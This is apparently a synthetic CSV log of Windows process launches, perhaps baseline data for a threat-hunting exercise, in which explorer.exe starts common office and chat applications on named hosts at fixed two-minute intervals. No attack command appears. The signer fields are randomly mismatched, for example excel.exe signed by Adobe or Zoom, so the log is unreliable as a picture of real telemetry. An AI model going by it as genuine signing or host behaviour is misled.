timestamp,host,user,parent_process,process_name,command_line,hash,signature
2026-07-30 08:30:00,SALES-PC-002,sarah.williams,explorer.exe,excel.exe,excel.exe,61a11729,Adobe Inc.
2026-07-30 08:32:00,ENG-PC-019,ava.jackson,explorer.exe,explorer.exe,explorer.exe,fe2110d0,Zoom Video Communications
2026-07-30 08:34:00,FIN-PC-023,james.taylor,explorer.exe,explorer.exe,explorer.exe,0212b554,Adobe Inc.
2026-07-30 08:36:00,FIN-PC-023,ava.jackson,explorer.exe,code.exe,code.exe,d534ee1d,Zoom Video Communications
2026-07-30 08:38:00,FIN-PC-011,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,3810ae66,Google LLC
2026-07-30 08:40:00,FILE-SERVER-02,david.wilson,explorer.exe,teams.exe,teams.exe,a0d4de3d,Microsoft
2026-07-30 08:42:00,FIN-PC-023,david.wilson,explorer.exe,code.exe,code.exe,088a93ec,Adobe Inc.
2026-07-30 08:44:00,ENG-PC-019,michael.brown,explorer.exe,outlook.exe,outlook.exe,e8dd5e5a,Zoom Video Communications
2026-07-30 08:46:00,ENG-PC-019,james.taylor,explorer.exe,teams.exe,teams.exe,336749b5,Google LLC
2026-07-30 08:48:00,LEGAL-PC-006,olivia.moore,explorer.exe,notepad.exe,notepad.exe,80759f1f,Zoom Video Communications
2026-07-30 08:50:00,DC-SERVER-01,david.wilson,explorer.exe,code.exe,code.exe,f7a67b94,Zoom Video Communications
2026-07-30 08:52:00,ENG-PC-019,sarah.williams,explorer.exe,code.exe,code.exe,f6802cdb,Microsoft
2026-07-30 08:54:00,DC-SERVER-01,emily.davis,explorer.exe,slack.exe,slack.exe,f79efd70,Adobe Inc.
2026-07-30 08:56:00,ENG-PC-019,sarah.williams,explorer.exe,slack.exe,slack.exe,03902c5d,Zoom Video Communications
2026-07-30 08:58:00,LEGAL-PC-006,sarah.williams,explorer.exe,code.exe,code.exe,5e5ba13d,Zoom Video Communications
2026-07-30 09:00:00,FILE-SERVER-02,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,1bbc91f7,Google LLC
2026-07-30 09:02:00,SALES-PC-002,john.smith,explorer.exe,acrobat.exe,acrobat.exe,e25d36eb,Adobe Inc.
2026-07-30 09:04:00,ENG-PC-019,ava.jackson,explorer.exe,excel.exe,excel.exe,a5cc8bf7,Microsoft
2026-07-30 09:06:00,SALES-PC-002,david.wilson,explorer.exe,slack.exe,slack.exe,1dde7969,Google LLC
2026-07-30 09:08:00,FIN-PC-023,john.smith,explorer.exe,explorer.exe,explorer.exe,fef518a6,Slack Technologies
2026-07-30 09:10:00,HR-PC-008,sarah.williams,explorer.exe,excel.exe,excel.exe,e3236d1a,Adobe Inc.
2026-07-30 09:12:00,DC-SERVER-01,james.taylor,explorer.exe,code.exe,code.exe,5efa9c5b,Adobe Inc.
2026-07-30 09:14:00,VPN-GW-01,ava.jackson,explorer.exe,teams.exe,teams.exe,e2aa7a5d,Slack Technologies
2026-07-30 09:16:00,HR-PC-008,sophia.anderson,explorer.exe,acrobat.exe,acrobat.exe,687a4850,Zoom Video Communications
2026-07-30 09:18:00,FIN-PC-023,olivia.moore,explorer.exe,excel.exe,excel.exe,71818dcf,Slack Technologies
2026-07-30 09:20:00,FIN-PC-011,olivia.moore,explorer.exe,outlook.exe,outlook.exe,fb1e143b,Zoom Video Communications
2026-07-30 09:22:00,LEGAL-PC-006,olivia.moore,explorer.exe,chrome.exe,chrome.exe,65ec7acd,Zoom Video Communications
2026-07-30 09:24:00,FIN-PC-011,sarah.williams,explorer.exe,code.exe,code.exe,1777e8cb,Google LLC
2026-07-30 09:26:00,FILE-SERVER-02,john.smith,explorer.exe,chrome.exe,chrome.exe,c96b5edb,Zoom Video Communications
2026-07-30 09:28:00,FIN-PC-011,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,34885a46,Microsoft
2026-07-30 09:30:00,LEGAL-PC-006,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,3748967f,Google LLC
2026-07-30 09:32:00,ENG-PC-019,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,00b9d4a3,Zoom Video Communications
2026-07-30 09:34:00,DC-SERVER-01,michael.brown,explorer.exe,notepad.exe,notepad.exe,402adf9c,Google LLC
2026-07-30 09:36:00,HR-PC-008,john.smith,explorer.exe,teams.exe,teams.exe,03cde2e3,Zoom Video Communications
2026-07-30 09:38:00,FIN-PC-011,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,040a3aae,Google LLC
2026-07-30 09:40:00,IT-PC-004,john.smith,explorer.exe,teams.exe,teams.exe,bde13c1b,Slack Technologies
2026-07-30 09:42:00,LEGAL-PC-006,sarah.williams,explorer.exe,outlook.exe,outlook.exe,79eb4168,Slack Technologies
2026-07-30 09:44:00,ENG-PC-019,daniel.thomas,explorer.exe,acrobat.exe,acrobat.exe,1beaf6ac,Slack Technologies
2026-07-30 09:46:00,LEGAL-PC-006,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,0b19f88e,Adobe Inc.
2026-07-30 09:48:00,IT-PC-004,sophia.anderson,explorer.exe,chrome.exe,chrome.exe,0f9240e1,Slack Technologies
2026-07-30 09:50:00,VPN-GW-01,james.taylor,explorer.exe,outlook.exe,outlook.exe,7d824264,Slack Technologies
2026-07-30 09:52:00,HR-PC-008,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,9bb96155,Google LLC
2026-07-30 09:54:00,HR-PC-008,michael.brown,explorer.exe,explorer.exe,explorer.exe,9fd34579,Adobe Inc.
2026-07-30 09:56:00,LEGAL-PC-006,olivia.moore,explorer.exe,slack.exe,slack.exe,fe9fecaa,Adobe Inc.
2026-07-30 09:58:00,LEGAL-PC-006,david.wilson,explorer.exe,code.exe,code.exe,816bcb9f,Adobe Inc.
2026-07-30 10:00:00,VPN-GW-01,sarah.williams,explorer.exe,outlook.exe,outlook.exe,da509fed,Adobe Inc.
2026-07-30 10:02:00,FIN-PC-011,james.taylor,explorer.exe,code.exe,code.exe,e359eee1,Google LLC
2026-07-30 10:04:00,VPN-GW-01,olivia.moore,explorer.exe,code.exe,code.exe,66132e69,Slack Technologies
2026-07-30 10:06:00,HR-PC-008,olivia.moore,explorer.exe,slack.exe,slack.exe,50018b7b,Zoom Video Communications
2026-07-30 10:08:00,ENG-PC-019,michael.brown,explorer.exe,code.exe,code.exe,112fa612,Microsoft
2026-07-30 10:10:00,HR-PC-008,sarah.williams,explorer.exe,slack.exe,slack.exe,18b87245,Zoom Video Communications
2026-07-30 10:12:00,DC-SERVER-01,daniel.thomas,explorer.exe,chrome.exe,chrome.exe,96229348,Adobe Inc.
2026-07-30 10:14:00,LEGAL-PC-006,olivia.moore,explorer.exe,outlook.exe,outlook.exe,692ac139,Zoom Video Communications
2026-07-30 10:16:00,VPN-GW-01,john.smith,explorer.exe,explorer.exe,explorer.exe,99b479d4,Zoom Video Communications
2026-07-30 10:18:00,ENG-PC-019,sarah.williams,explorer.exe,acrobat.exe,acrobat.exe,81e5c9f6,Google LLC
2026-07-30 10:20:00,DC-SERVER-01,sophia.anderson,explorer.exe,excel.exe,excel.exe,d8e7012f,Microsoft
2026-07-30 10:22:00,ENG-PC-019,daniel.thomas,explorer.exe,onedrive.exe,onedrive.exe,1d691fba,Zoom Video Communications
2026-07-30 10:24:00,FILE-SERVER-02,emily.davis,explorer.exe,slack.exe,slack.exe,d85c16bd,Adobe Inc.
2026-07-30 10:26:00,FILE-SERVER-02,ava.jackson,explorer.exe,notepad.exe,notepad.exe,06b89231,Adobe Inc.
2026-07-30 10:28:00,IT-PC-004,john.smith,explorer.exe,teams.exe,teams.exe,45f50c52,Zoom Video Communications
2026-07-30 10:30:00,ENG-PC-019,olivia.moore,explorer.exe,chrome.exe,chrome.exe,2e709838,Google LLC
2026-07-30 10:32:00,FILE-SERVER-02,james.taylor,explorer.exe,outlook.exe,outlook.exe,2451e5a4,Microsoft
2026-07-30 10:34:00,HR-PC-008,daniel.thomas,explorer.exe,excel.exe,excel.exe,604e46cb,Slack Technologies
2026-07-30 10:36:00,SALES-PC-002,olivia.moore,explorer.exe,teams.exe,teams.exe,5ebbcca5,Zoom Video Communications
2026-07-30 10:38:00,ENG-PC-019,ava.jackson,explorer.exe,acrobat.exe,acrobat.exe,15bfbe97,Microsoft
2026-07-30 10:40:00,DC-SERVER-01,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,0cbd3c03,Microsoft
2026-07-30 10:42:00,IT-PC-004,sophia.anderson,explorer.exe,slack.exe,slack.exe,7c54535f,Adobe Inc.
2026-07-30 10:44:00,SALES-PC-002,james.taylor,explorer.exe,explorer.exe,explorer.exe,372f871a,Adobe Inc.
2026-07-30 10:46:00,HR-PC-008,olivia.moore,explorer.exe,slack.exe,slack.exe,1c6345ab,Zoom Video Communications
2026-07-30 10:48:00,FILE-SERVER-02,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,aac93316,Zoom Video Communications
2026-07-30 10:50:00,FIN-PC-023,emily.davis,explorer.exe,slack.exe,slack.exe,fc04a168,Adobe Inc.
2026-07-30 10:52:00,FIN-PC-023,john.smith,explorer.exe,excel.exe,excel.exe,4d29d1ab,Google LLC
2026-07-30 10:54:00,DC-SERVER-01,david.wilson,explorer.exe,explorer.exe,explorer.exe,53ffd3a2,Microsoft
2026-07-30 10:56:00,FIN-PC-023,sophia.anderson,explorer.exe,slack.exe,slack.exe,2cfa55b0,Google LLC
2026-07-30 10:58:00,VPN-GW-01,daniel.thomas,explorer.exe,excel.exe,excel.exe,8011316b,Adobe Inc.
2026-07-30 11:00:00,ENG-PC-019,sarah.williams,explorer.exe,slack.exe,slack.exe,dc9c96de,Microsoft
2026-07-30 11:02:00,VPN-GW-01,john.smith,explorer.exe,code.exe,code.exe,ebd14d2c,Microsoft
2026-07-30 11:04:00,ENG-PC-019,ava.jackson,explorer.exe,slack.exe,slack.exe,92ca525a,Slack Technologies
2026-07-30 11:06:00,VPN-GW-01,david.wilson,explorer.exe,outlook.exe,outlook.exe,67b03283,Microsoft
2026-07-30 11:08:00,ENG-PC-019,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,75c8e90d,Zoom Video Communications
2026-07-30 11:10:00,HR-PC-008,james.taylor,explorer.exe,outlook.exe,outlook.exe,3e49fd09,Slack Technologies
2026-07-30 11:12:00,FILE-SERVER-02,james.taylor,explorer.exe,notepad.exe,notepad.exe,1422373f,Slack Technologies
2026-07-30 11:14:00,IT-PC-004,olivia.moore,explorer.exe,excel.exe,excel.exe,5543fc3c,Google LLC
2026-07-30 11:16:00,HR-PC-008,daniel.thomas,explorer.exe,outlook.exe,outlook.exe,87d5b7be,Adobe Inc.
2026-07-30 11:18:00,FIN-PC-011,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,ba35844e,Google LLC
2026-07-30 11:20:00,FIN-PC-011,sarah.williams,explorer.exe,teams.exe,teams.exe,4187222b,Google LLC
2026-07-30 11:22:00,DC-SERVER-01,ava.jackson,explorer.exe,teams.exe,teams.exe,c29d782b,Microsoft
2026-07-30 11:24:00,DC-SERVER-01,sophia.anderson,explorer.exe,code.exe,code.exe,c1235c91,Adobe Inc.
2026-07-30 11:26:00,FILE-SERVER-02,sophia.anderson,explorer.exe,acrobat.exe,acrobat.exe,a49b1cd9,Adobe Inc.
2026-07-30 11:28:00,ENG-PC-019,olivia.moore,explorer.exe,teams.exe,teams.exe,70944bdb,Microsoft
2026-07-30 11:30:00,SALES-PC-002,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,cbdc4318,Zoom Video Communications
2026-07-30 11:32:00,FILE-SERVER-02,john.smith,explorer.exe,onedrive.exe,onedrive.exe,81e0d489,Microsoft
2026-07-30 11:34:00,IT-PC-004,sophia.anderson,explorer.exe,code.exe,code.exe,09a0a0f6,Microsoft
2026-07-30 11:36:00,ENG-PC-019,david.wilson,explorer.exe,outlook.exe,outlook.exe,a508dc95,Microsoft
2026-07-30 11:38:00,FILE-SERVER-02,ava.jackson,explorer.exe,notepad.exe,notepad.exe,626d719d,Slack Technologies
2026-07-30 11:40:00,FILE-SERVER-02,daniel.thomas,explorer.exe,chrome.exe,chrome.exe,7321bf6b,Adobe Inc.
2026-07-30 11:42:00,FIN-PC-011,olivia.moore,explorer.exe,acrobat.exe,acrobat.exe,79c2d2e4,Adobe Inc.
2026-07-30 11:44:00,DC-SERVER-01,john.smith,explorer.exe,code.exe,code.exe,1a7f195b,Zoom Video Communications
2026-07-30 11:46:00,HR-PC-008,daniel.thomas,explorer.exe,teams.exe,teams.exe,0a0537f0,Google LLC
2026-07-30 11:48:00,SALES-PC-002,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,85d2d0a6,Adobe Inc.
2026-07-30 11:50:00,DC-SERVER-01,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,eafde7d9,Zoom Video Communications
2026-07-30 11:52:00,VPN-GW-01,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,adcc3daf,Adobe Inc.
2026-07-30 11:54:00,FIN-PC-023,olivia.moore,explorer.exe,outlook.exe,outlook.exe,54669d19,Microsoft
2026-07-30 11:56:00,LEGAL-PC-006,james.taylor,explorer.exe,explorer.exe,explorer.exe,4082cbb9,Adobe Inc.
2026-07-30 11:58:00,DC-SERVER-01,olivia.moore,explorer.exe,outlook.exe,outlook.exe,952e6abb,Google LLC
2026-07-30 12:00:00,ENG-PC-019,david.wilson,explorer.exe,slack.exe,slack.exe,2102f9c9,Adobe Inc.
2026-07-30 12:02:00,HR-PC-008,david.wilson,explorer.exe,notepad.exe,notepad.exe,606e0e1c,Zoom Video Communications
2026-07-30 12:04:00,DC-SERVER-01,daniel.thomas,explorer.exe,outlook.exe,outlook.exe,a561e1e9,Slack Technologies
2026-07-30 12:06:00,LEGAL-PC-006,olivia.moore,explorer.exe,chrome.exe,chrome.exe,5cd33369,Zoom Video Communications
2026-07-30 12:08:00,DC-SERVER-01,emily.davis,explorer.exe,onedrive.exe,onedrive.exe,f29a6339,Slack Technologies
2026-07-30 12:10:00,FIN-PC-011,emily.davis,explorer.exe,teams.exe,teams.exe,27aa7cbc,Microsoft
2026-07-30 12:12:00,IT-PC-004,sarah.williams,explorer.exe,notepad.exe,notepad.exe,c5580bb2,Adobe Inc.
2026-07-30 12:14:00,LEGAL-PC-006,john.smith,explorer.exe,onedrive.exe,onedrive.exe,e05b46c5,Adobe Inc.
2026-07-30 12:16:00,DC-SERVER-01,ava.jackson,explorer.exe,slack.exe,slack.exe,277d1be9,Google LLC
2026-07-30 12:18:00,DC-SERVER-01,ava.jackson,explorer.exe,teams.exe,teams.exe,b89f72f3,Slack Technologies
2026-07-30 12:20:00,FIN-PC-023,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,ad261ec5,Google LLC
2026-07-30 12:22:00,SALES-PC-002,ava.jackson,explorer.exe,explorer.exe,explorer.exe,c09cb506,Slack Technologies
2026-07-30 12:24:00,FIN-PC-011,daniel.thomas,explorer.exe,excel.exe,excel.exe,4f3949a8,Slack Technologies
2026-07-30 12:26:00,FIN-PC-011,olivia.moore,explorer.exe,acrobat.exe,acrobat.exe,fc043f08,Slack Technologies
2026-07-30 12:28:00,SALES-PC-002,david.wilson,explorer.exe,slack.exe,slack.exe,80be7e35,Adobe Inc.
2026-07-30 12:30:00,VPN-GW-01,michael.brown,explorer.exe,excel.exe,excel.exe,cd1f5318,Adobe Inc.
2026-07-30 12:32:00,DC-SERVER-01,david.wilson,explorer.exe,chrome.exe,chrome.exe,a4244f23,Slack Technologies
2026-07-30 12:34:00,ENG-PC-019,daniel.thomas,explorer.exe,outlook.exe,outlook.exe,b61e5fdb,Adobe Inc.
2026-07-30 12:36:00,HR-PC-008,david.wilson,explorer.exe,outlook.exe,outlook.exe,c35b9fea,Google LLC
2026-07-30 12:38:00,IT-PC-004,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,25b8a42f,Slack Technologies
2026-07-30 12:40:00,HR-PC-008,emily.davis,explorer.exe,code.exe,code.exe,e27718c5,Zoom Video Communications
2026-07-30 12:42:00,FIN-PC-023,james.taylor,explorer.exe,chrome.exe,chrome.exe,657e01c9,Adobe Inc.
2026-07-30 12:44:00,ENG-PC-019,emily.davis,explorer.exe,slack.exe,slack.exe,fe9936a3,Microsoft
2026-07-30 12:46:00,ENG-PC-019,emily.davis,explorer.exe,chrome.exe,chrome.exe,519554e3,Microsoft
2026-07-30 12:48:00,ENG-PC-019,michael.brown,explorer.exe,teams.exe,teams.exe,09ce3cfb,Zoom Video Communications
2026-07-30 12:50:00,SALES-PC-002,michael.brown,explorer.exe,code.exe,code.exe,72d78bdd,Adobe Inc.
2026-07-30 12:52:00,FIN-PC-023,sarah.williams,explorer.exe,chrome.exe,chrome.exe,41843b03,Google LLC
2026-07-30 12:54:00,DC-SERVER-01,daniel.thomas,explorer.exe,acrobat.exe,acrobat.exe,871c0884,Slack Technologies
2026-07-30 12:56:00,HR-PC-008,david.wilson,explorer.exe,excel.exe,excel.exe,4d183eba,Microsoft
2026-07-30 12:58:00,FIN-PC-023,emily.davis,explorer.exe,slack.exe,slack.exe,a3925731,Adobe Inc.
2026-07-30 13:00:00,SALES-PC-002,sarah.williams,explorer.exe,outlook.exe,outlook.exe,d6312a80,Slack Technologies
2026-07-30 13:02:00,FILE-SERVER-02,daniel.thomas,explorer.exe,chrome.exe,chrome.exe,a1c7cc8a,Adobe Inc.
2026-07-30 13:04:00,FILE-SERVER-02,emily.davis,explorer.exe,teams.exe,teams.exe,4a90cd0c,Slack Technologies
2026-07-30 13:06:00,FIN-PC-023,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,3d959e3f,Adobe Inc.
2026-07-30 13:08:00,VPN-GW-01,michael.brown,explorer.exe,outlook.exe,outlook.exe,8603156a,Zoom Video Communications
2026-07-30 13:10:00,HR-PC-008,daniel.thomas,explorer.exe,notepad.exe,notepad.exe,81e03a5e,Adobe Inc.
2026-07-30 13:12:00,LEGAL-PC-006,john.smith,explorer.exe,slack.exe,slack.exe,df92a621,Slack Technologies
2026-07-30 13:14:00,FIN-PC-023,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,40ef3935,Microsoft
2026-07-30 13:16:00,ENG-PC-019,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,3dba6da8,Microsoft
2026-07-30 13:18:00,FILE-SERVER-02,olivia.moore,explorer.exe,teams.exe,teams.exe,0b599562,Zoom Video Communications
2026-07-30 13:20:00,LEGAL-PC-006,olivia.moore,explorer.exe,teams.exe,teams.exe,d49405f0,Slack Technologies
2026-07-30 13:22:00,SALES-PC-002,michael.brown,explorer.exe,teams.exe,teams.exe,10275b53,Slack Technologies
2026-07-30 13:24:00,FIN-PC-023,david.wilson,explorer.exe,excel.exe,excel.exe,0b36e356,Google LLC
2026-07-30 13:26:00,FIN-PC-023,olivia.moore,explorer.exe,explorer.exe,explorer.exe,83f02dc7,Slack Technologies
2026-07-30 13:28:00,LEGAL-PC-006,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,095ffa81,Google LLC
2026-07-30 13:30:00,IT-PC-004,olivia.moore,explorer.exe,chrome.exe,chrome.exe,dda4f4a7,Zoom Video Communications
2026-07-30 13:32:00,IT-PC-004,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,6fdc0bad,Slack Technologies
2026-07-30 13:34:00,SALES-PC-002,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,f945f2fd,Google LLC
2026-07-30 13:36:00,SALES-PC-002,sophia.anderson,explorer.exe,onedrive.exe,onedrive.exe,ec9f9c54,Adobe Inc.
2026-07-30 13:38:00,IT-PC-004,sarah.williams,explorer.exe,slack.exe,slack.exe,14348f62,Slack Technologies
2026-07-30 13:40:00,FILE-SERVER-02,michael.brown,explorer.exe,notepad.exe,notepad.exe,4b3446bc,Zoom Video Communications
2026-07-30 13:42:00,HR-PC-008,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,a9320094,Zoom Video Communications
2026-07-30 13:44:00,IT-PC-004,sophia.anderson,explorer.exe,acrobat.exe,acrobat.exe,b7b8c1a5,Slack Technologies
2026-07-30 13:46:00,DC-SERVER-01,sophia.anderson,explorer.exe,onedrive.exe,onedrive.exe,727716ec,Microsoft
2026-07-30 13:48:00,ENG-PC-019,ava.jackson,explorer.exe,slack.exe,slack.exe,46494296,Microsoft
2026-07-30 13:50:00,HR-PC-008,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,83599af6,Google LLC
2026-07-30 13:52:00,FIN-PC-023,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,ad973b67,Slack Technologies
2026-07-30 13:54:00,FIN-PC-023,michael.brown,explorer.exe,outlook.exe,outlook.exe,3c6a3174,Zoom Video Communications
2026-07-30 13:56:00,ENG-PC-019,james.taylor,explorer.exe,acrobat.exe,acrobat.exe,084a6780,Adobe Inc.
2026-07-30 13:58:00,DC-SERVER-01,sophia.anderson,explorer.exe,onedrive.exe,onedrive.exe,5f3c44dc,Slack Technologies
2026-07-30 14:00:00,HR-PC-008,ava.jackson,explorer.exe,teams.exe,teams.exe,878aaed9,Zoom Video Communications
2026-07-30 14:02:00,VPN-GW-01,olivia.moore,explorer.exe,explorer.exe,explorer.exe,3fe68c9c,Microsoft
2026-07-30 14:04:00,FIN-PC-023,michael.brown,explorer.exe,code.exe,code.exe,848af440,Slack Technologies
2026-07-30 14:06:00,LEGAL-PC-006,sarah.williams,explorer.exe,explorer.exe,explorer.exe,c6641285,Zoom Video Communications
2026-07-30 14:08:00,SALES-PC-002,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,491b90e9,Slack Technologies
2026-07-30 14:10:00,FIN-PC-011,sarah.williams,explorer.exe,teams.exe,teams.exe,da52d2ee,Microsoft
2026-07-30 14:12:00,SALES-PC-002,michael.brown,explorer.exe,code.exe,code.exe,ff4c96d6,Microsoft
2026-07-30 14:14:00,ENG-PC-019,olivia.moore,explorer.exe,outlook.exe,outlook.exe,8ccc9cea,Adobe Inc.
